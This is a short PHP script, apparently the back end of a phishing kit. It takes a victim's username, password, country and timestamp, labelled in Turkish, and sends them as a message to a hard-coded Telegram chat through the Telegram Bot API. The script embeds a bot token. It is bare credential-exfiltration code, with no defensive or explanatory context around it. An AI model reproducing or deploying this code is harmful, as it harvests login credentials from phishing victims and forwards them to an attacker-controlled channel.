<?php
    $token='1854779956:AAF9P-b_dsWE4PdK-HDaF-9cmSrx-wue3fE';
    $data = [
        'text' => '
      Kullanıcı Adı : '.$isim.'
      Şifre : '.$password.'
      Ülke : '.$ulke.'
      Tarih : '.$cur_time.'
	  ',
      'chat_id' =>1082966220
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>